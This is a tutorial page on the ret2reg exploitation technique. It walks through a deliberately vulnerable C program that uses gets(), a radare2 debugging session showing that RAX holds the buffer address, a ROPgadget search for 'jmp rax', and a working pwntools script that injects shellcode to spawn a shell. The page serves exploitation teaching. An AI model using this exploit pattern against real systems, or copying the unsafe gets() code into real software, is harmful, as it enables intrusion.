# Using ret2reg

## Source

Any function that returns a pointer to the string once it acts on it is a prime target. There are many that do this, including stuff like `gets()`, `strcpy()` and `fgets()`. We''l keep it simple and use `gets()` as an example.

```c
#include <stdio.h>

void vuln() {
    char buffer[100];
    gets(buffer);
}

int main() {
    vuln();
    return 0;
}
```

## Analysis

First, let's make sure that some register _does_ point to the buffer:

```text
$ r2 -d -A vuln

[0x7f8ac76fa090]> pdf @ sym.vuln 
            ; CALL XREF from main @ 0x401147
┌ 28: sym.vuln ();
│           ; var int64_t var_70h @ rbp-0x70
│           0x00401122      55             push rbp
│           0x00401123      4889e5         mov rbp, rsp
│           0x00401126      4883ec70       sub rsp, 0x70
│           0x0040112a      488d4590       lea rax, [var_70h]
│           0x0040112e      4889c7         mov rdi, rax
│           0x00401131      b800000000     mov eax, 0
│           0x00401136      e8f5feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x0040113b      90             nop
│           0x0040113c      c9             leave
└           0x0040113d      c3             ret
```

Now we'll set a breakpoint on the `ret` in `vuln()`, continue and enter text`.`

```text
[0x7f8ac76fa090]> db 0x0040113d
[0x7f8ac76fa090]> dc
hello
hit breakpoint at: 40113d
```

We've hit the breakpoint, let's check if RAX points to our register. We'll assume RAX first because that's the traditional register to use for the return value.

```text
[0x0040113d]> dr rax
0x7ffd419895c0
[0x0040113d]> ps @ 0x7ffd419895c0
hello
```

And indeed it does!

## Exploitation

We now just need a `jmp rax` gadget or equivalent. I'll use [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) for this and look for either `jmp rax` or `call rax`:

```text
$ ROPgadget --binary vuln | grep -iE "(jmp|call) rax"

0x0000000000401009 : add byte ptr [rax], al ; test rax, rax ; je 0x401019 ; call rax
0x0000000000401010 : call rax
0x000000000040100e : je 0x401014 ; call rax
0x0000000000401095 : je 0x4010a7 ; mov edi, 0x404030 ; jmp rax
0x00000000004010d7 : je 0x4010e7 ; mov edi, 0x404030 ; jmp rax
0x000000000040109c : jmp rax
0x0000000000401097 : mov edi, 0x404030 ; jmp rax
0x0000000000401096 : or dword ptr [rdi + 0x404030], edi ; jmp rax
0x000000000040100c : test eax, eax ; je 0x401016 ; call rax
0x0000000000401093 : test eax, eax ; je 0x4010a9 ; mov edi, 0x404030 ; jmp rax
0x00000000004010d5 : test eax, eax ; je 0x4010e9 ; mov edi, 0x404030 ; jmp rax
0x000000000040100b : test rax, rax ; je 0x401017 ; call rax
```

There's a `jmp rax` at `0x40109c`, so I'll use that. The padding up until RIP is `120`; I assume you can calculate this yourselves by now, so I won't bother showing it.

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

JMP_RAX = 0x40109c

payload = asm(shellcraft.sh())        # front of buffer <- RAX points here
payload = payload.ljust(120, b'A')    # pad until RIP
payload += p64(JMP_RAX)               # jump to the buffer - return value of gets()

p.sendline(payload)
p.interactive()
```

![](../../../../.gitbook/assets/image%20%2846%29.png)

Awesome!

